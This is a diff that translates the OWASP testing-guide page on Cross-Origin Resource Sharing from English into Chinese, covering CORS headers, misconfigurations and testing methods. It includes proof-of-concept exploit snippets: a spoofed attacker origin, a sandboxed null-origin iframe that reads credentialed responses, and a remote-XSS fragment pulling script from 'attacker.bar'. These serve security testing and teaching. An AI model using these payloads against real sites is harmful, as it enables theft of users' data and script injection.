@@ -1,68 +1,68 @@
-# Testing Cross Origin Resource Sharing
+# 测试跨域资源共享
 
 |ID          |
 |------------|
 |WSTG-CLNT-07|
 
-## Summary
+## 概述
 
-[Cross Origin Resource Sharing](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) (CORS) is a mechanism that enables a web browser to perform cross-domain requests using the XMLHttpRequest (XHR) Level 2 (L2) API in a controlled manner. In the past, the XHR L1 API only allowed requests to be sent within the same origin as it was restricted by the [Same Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) (SOP).
+[跨域资源共享](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing)（CORS）是一种使Web浏览器能够使用XMLHttpRequest（XHR）Level 2（L2）API以受控方式进行跨域请求的机制。过去，XHR L1 API仅允许请求在同一源内发送，因为它受[同源策略](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)（SOP）限制。
 
-Cross-origin requests have an `Origin` header that identifies the domain initiating the request and is always sent to the server. CORS defines the protocol to use between a web browser and a server to determine whether a cross-origin request is allowed. HTTP [headers](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers) are used to accomplish this.
+跨域请求有一个`Origin`头，标识发起请求的域，并始终发送到服务器。CORS定义Web浏览器和服务器之间使用的协议，以确定是否允许跨域请求。HTTP[头](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers)用于实现此目的。
 
-The [W3C CORS specification](https://www.w3.org/TR/cors/) mandates that for non simple requests, such as requests other than GET or POST or requests that uses credentials, a pre-flight OPTIONS request must be sent in advance to check if the type of request will have a bad impact on the data. The pre-flight request checks the methods and headers allowed by the server, and if credentials are permitted. Based on the result of the OPTIONS request, the browser decides whether the request is allowed or not.
+[W3C CORS规范](https://www.w3.org/TR/cors/)要求对于非简单请求（如GET或POST以外的请求，或使用凭据的请求），必须提前发送预检OPTIONS请求，以检查请求类型是否会对数据产生不良影响。预检请求检查服务器允许的方法和头，以及是否允许凭据。基于OPTIONS请求的结果，浏览器决定是否允许请求。
 
-### Origin & Access-Control-Allow-Origin
+### Origin和Access-Control-Allow-Origin
 
-The `Origin` request header is always sent by the browser in a CORS request and indicates the origin of the request. The Origin header cannot be changed from JavaScript as [the browser (the user-agent) blocks its modification](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name); however, relying on this header for Access Control checks is not a good idea as it may be spoofed outside the browser, for example by using a proxy, so you still need to check that application-level protocols are used to protect sensitive data.
+`Origin`请求头始终由浏览器在CORS请求中发送，并指示请求的来源。Origin头不能从JavaScript更改，因为[浏览器（用户代理）阻止其修改](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name)；但是，依赖此头进行访问控制检查并不是一个好主意，因为它可能在浏览器外被欺骗，例如通过使用代理，因此您仍然需要检查应用程序级协议是否用于保护敏感数据。
 
-`Access-Control-Allow-Origin` is a response header used by a server to indicate which domains are allowed to read the response. Based on the CORS W3 Specification it is up to the client to determine and enforce the restriction of whether the client has access to the response data based on this header.
+`Access-Control-Allow-Origin`是服务器用于指示哪些域允许读取响应的响应头。根据CORS W3规范，由客户端确定并强制执行客户端是否有权访问基于此头的响应数据的限制。
 
-From a security testing perspective you should look for insecure configurations as for example using a `*` wildcard as value of the `Access-Control-Allow-Origin` header that means all domains are allowed. Another insecure example is when the server returns back the origin header without any additional checks, which can lead to access of sensitive data. Note that the configuration of allowing cross-origin requests is very insecure and is not acceptable in general terms, except in the case of a public API that is intended to be accessible by everyone.
+从安全测试的角度来看，您应查找不安全配置，例如使用`*`作为`Access-Control-Allow-Origin`头的值，这意味着允许所有域。另一个不安全的例子是当服务器返回原始头而没有任何额外检查时，这可能导致访问敏感数据。请注意，允许跨域请求的配置非常不安全，通常不可接受，除非是面向公众的API，旨在让每个人访问。
 
-### Access-Control-Request-Method & Access-Control-Allow-Method
+### Access-Control-Request-Method和Access-Control-Allow-Method
 
-The `Access-Control-Request-Method` header is used when a browser performs a preflight OPTIONS request and lets the client indicate the request method of the final request. On the other hand, the `Access-Control-Allow-Method` is a response header used by the server to describe the methods the clients are allowed to use.
+`Access-Control-Request-Method`头在浏览器执行预检OPTIONS请求时使用，让客户端指示最终请求的请求方法。另一方面，`Access-Control-Allow-Method`是服务器使用的响应头，描述允许客户端使用的方法。
 
-### Access-Control-Request-Headers & Access-Control-Allow-Headers
+### Access-Control-Request-Headers和Access-Control-Allow-Headers
 
-These two headers are used between the browser and the server to determine which headers can be used to perform a cross-origin request.
+这两个头在浏览器和服务器之间使用，以确定哪些头可用于执行跨域请求。
 
 ### Access-Control-Allow-Credentials
 
-This response header allows browsers to read the response when credentials are passed. When the header is sent, the web application must set an origin to the value of the `Access-Control-Allow-Origin` header. The `Access-Control-Allow-Credentials` header cannot be used along with the `Access-Control-Allow-Origin` header whose value is the `*` wildcard like the following:
+此响应头允许浏览器在传递凭据时读取响应。当设置此头时，Web应用程序必须将源设置为`Access-Control-Allow-Origin`头的值。`Access-Control-Allow-Credentials`头不能与`Access-Control-Allow-Origin`头一起使用，其值为`*`通配符，如下所示：
 
 ```http
 Access-Control-Allow-Origin: *
 Access-Control-Allow-Credentials: true
 ```
 
-### Input Validation
+### 输入验证
 
-XHR L2 introduces the possibility of creating a cross-domain request using the XHR API for backwards compatibility. This can introduce security vulnerabilities that in XHR L1 were not present. Interesting points of the code to exploit would be URLs that are passed to XMLHttpRequest without validation, specially if absolute URLs are allowed because that could lead to code injection. Likewise, other part of the application that can be exploited is if the response data is not escaped and we can control it by providing user-supplied input.
+XHR L2引入了使用XHR API创建跨域请求的可能性，用于向后兼容。这可能引入XHR L1中不存在的安全漏洞。代码利用的有趣点是将URL传递给XMLHttpRequest而未验证它们，特别是如果允许绝对URL，因为这可能导致代码注入。同样，应用程序的另一部分可能被利用，如果响应数据未转义，我们可以通过提供用户提供的输入来控制它。
 
-### Other Headers
+### 其他头
 
-There are other headers involved like `Access-Control-Max-Age` that determines the time a preflight request can be cached in the browser, or `Access-Control-Expose-Headers` that indicates which headers are safe to expose to the API of a CORS API specification.
+还有涉及其他头，如`Access-Control-Max-Age`，决定预检请求可以在浏览器中缓存的时间，或`Access-Control-Expose-Headers`，指示哪些头可以安全地暴露给CORS API的API。
 
-To review CORS headers, refer to the [CORS MDN document](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#The_HTTP_response_headers).
+要审查CORS头，请参阅[CORS MDN文档](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#The_HTTP_response_headers)。
 
-## Test Objectives
+## 测试目标
 
-- Identify endpoints that implement CORS.
-- Ensure that the CORS configuration is secure or harmless.
+- 识别实施CORS的端点。
+- 确保CORS配置安全或无害。
 
-## How to Test
+## 如何测试
 
-A tool such as [ZAP](https://www.zaproxy.org) can enable testers to intercept HTTP headers, which can reveal how CORS is used. Testers should pay particular attention to the origin header to learn which domains are allowed. Also, in some cases, manual inspection of the JavaScript is needed to determine whether the code is vulnerable to code injection due to improper handling of user supplied input.
+可以使用[ZAP](https://www.zaproxy.org)等工具来启用测试人员拦截HTTP头，这可以揭示CORS的使用方式。测试人员应特别关注origin头以了解允许哪些域。此外，在某些情况下，需要手动检查JavaScript以确定代码是否因不当处理用户提供的输入而容易受到代码注入。
 
-### CORS Misconfiguration
+### CORS错误配置
 
-Setting the wildcard to the `Access-Control-Allow-Origin header` (that is, `Access-Control-Allow-Origin: *`) is not secure if the response contains sensitive information. Although it cannot be used with the `Access-Control-Allow-Credentials: true` at the same time, it can be dangerous where the access control is done solely by the firewall rules or the source IP addresses, other than being protected by credentials.
+将通配符设置为`Access-Control-Allow-Origin`头（即`Access-Control-Allow-Origin: *`）是不安全的，如果响应包含敏感信息。虽然它不能与`Access-Control-Allow-Credentials: true`同时使用，但在访问控制仅由防火墙规则或源IP地址（而不是凭据保护）完成的情况下，这可能很危险。
 
-#### Wildcard Access-Control-Allow-Origin
+#### 通配符Access-Control-Allow-Origin
 
-A tester can check if the `Access-Control-Allow-Origin: *` exists in the HTTP response messages.
+测试人员可以检查`Access-Control-Allow-Origin: *`是否存在于HTTP响应消息中。
 
 ```http
 HTTP/1.1 200 OK
@@ -74,7 +74,7 @@ Content-Type: application/xml
 [Response Body]
 ```
 
-If a response contains sensitive data, an attacker can steal it through the usage of XHR:
+如果响应包含敏感数据，攻击者可以通过使用XHR来窃取它：
 
 ```html
 <html>
@@ -98,9 +98,9 @@ If a response contains sensitive data, an attacker can steal it through the usag
 </html>
 ```
 
-#### Dynamic CORS Policy
+#### 动态CORS策略
 
-A modern web application or API may be implemented to allow cross-origin requests dynamically, generally in order to allow the requests from the sub domains like the following:
+现代Web应用程序或API可能动态允许跨域请求，通常是为了允许来自子域的请求，如下所示：
 
 ```php
 if (preg_match('|\.example.com$|', $_SERVER['SERVER_NAME'])) {
@@ -109,7 +109,7 @@ if (preg_match('|\.example.com$|', $_SERVER['SERVER_NAME'])) {
 }
 ```
 
-In this example, all the requests from the subdomains of example.com will be allowed. It must be ensured that the regular expression that is used to match is complete. Otherwise, if it was simply matched with `example.com` (without `$` appended), attackers might be able to bypass the CORS policy by appending their domain to the `Origin` header.
+在此示例中，将允许来自example.com子域的所有请求。必须确保用于匹配的正则表达式是完整的。否则，如果仅使用`example.com`（没有附加`$`）匹配，攻击者可能通过向`Origin`头附加其域来绕过CORS策略。
 
 ```http
 GET /test.php HTTP/1.1
@@ -119,7 +119,7 @@ Origin: https://example.com.attacker.com
 Cookie: <session cookie>
 ```
 
-When the request above is sent, if the following response is returned with the `Access-Control-Allow-Origin` whose value is the same as the attacker's input, the attacker can read the response afterwards and access sensitive information that is only accessible by a victim user.
+当发送上述请求时，如果返回的响应中的`Access-Control-Allow-Origin`的值与攻击者的输入相同，攻击者可以读取响应并访问仅可由受害用户访问的敏感信息。
 
 ```http
 HTTP/1.1 200 OK
@@ -132,13 +132,13 @@ Content-Type: application/xml
 [Response Body]
 ```
 
-#### Allowlisted Null Origin Value
+#### 允许的Null Origin值
 
-The `Origin` header may have the value `null` in specific situations, such as requests triggered from a local file, a redirect, or a serialized object. Developers sometimes allowlist the `null` origin to facilitate local development or to support non-web clients.
+`Origin`头在特定情况下可能具有`null`值，如由本地文件、重定向或序列化对象触发的请求。开发人员有时允许列表`null`源以方便本地开发或支持非Web客户端。
 
-However, the `null` origin serves as a "wildcard" that can be exploited. An attacker can programmatically generate a request with the origin `null` by using a sandboxed `iframe`.
+但是，`null`源作为可利用的"通配符"。攻击者可以通过使用沙盒`iframe`以编程方式生成具有origin `null`的请求。
 
-If the server simply reflects the `null` origin in the response headers, especially with credentials allowed, it creates a vulnerability similar to the generic wildcard.
+如果服务器简单地在响应头中反映`null`源，特别是允许凭据，则会创建类似于通用通配符的漏洞。
 
 ```http
 HTTP/1.1 200 OK
@@ -149,7 +149,7 @@ Content-Length: 4
 Content-Type: application/xml
 ```
 
-In an exploit scenario, an attacker embeds a sandboxed `iframe` on their malicious site. The `sandbox` attribute forces the browser to set the `Origin` of requests initiated from within that frame to `null`.
+在利用场景中，攻击者在其恶意站点上嵌入沙盒`iframe`。`sandbox`属性强制浏览器将从该帧内发起的请求的`Origin`设置为`null`。
 
 ```html
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
@@ -167,17 +167,17 @@ In an exploit scenario, an attacker embeds a sandboxed `iframe` on their malicio
 </iframe>
 ```
 
-Consequently, the browser sees the request coming from `null`, the server allows `null`, and the attacker successfully reads the sensitive response.
+因此，浏览器看到请求来自`null`，服务器允许`null`，攻击者成功读取了敏感响应。
 
-### Input Validation Weakness
+### 输入验证弱点
 
-The CORS concept can be viewed from a completely different angle. An attacker may allow their CORS policy on purpose to inject code to the target web application.
+CORS概念可以从完全不同的角度看待。攻击者可能故意允许其CORS策略将代码注入目标Web应用程序。
 
-#### Remote XSS with CORS
+#### 带CORS的远程XSS
 
-This code makes a request to the resource passed after the `#` character in the URL, initially used to get resources in the same server.
+此代码向URL中`#`字符后传递的资源发出请求，最初用于从同一服务器获取资源。
 
-Vulnerable code:
+易受攻击的代码：
 
 ```html
 <script>
@@ -199,11 +199,11 @@ Vulnerable code:
 </body>
 ```
 
-For example, a request like this will show the contents of the `profile.php` file:
+例如，像这样的请求将显示`profile.php`文件的内容：
 
 `https://example.foo/main.php#profile.php`
 
-Request and response generated by `https://example.foo/profile.php`:
+由`https://example.foo/profile.php`生成的请求和响应：
 
 ```html
 GET /profile.php HTTP/1.1
@@ -220,13 +220,13 @@ Content-Type: text/html
 [Response Body]
 ```
 
-Now, as there is no URL validation we can inject a remote script, that will be injected and executed in the context of the `example.foo` domain, with a URL like this:
+现在，由于没有URL验证，我们可以注入远程脚本，这将注入并在与`example.foo`域的上下文中执行，URL如下：
 
 ```text
 https://example.foo/main.php#https://attacker.bar/file.php
 ```
 
-Request and response generated by `https://attacker.bar/file.php`:
+由`https://attacker.bar/file.php`生成的请求和响应：
 
 ```html
 GET /file.php HTTP/1.1
@@ -244,7 +244,7 @@ Content-Type: text/html
 Injected Content from attacker.bar <img src="#" onerror="alert('Domain: '+document.domain)">
 ```
 
-## References
+## 参考资料
 
-- [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing)
-- [MDN Cross-Origin Resources Sharing](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
+- [OWASP HTML5安全速查表](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing)
+- [MDN跨域资源共享](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
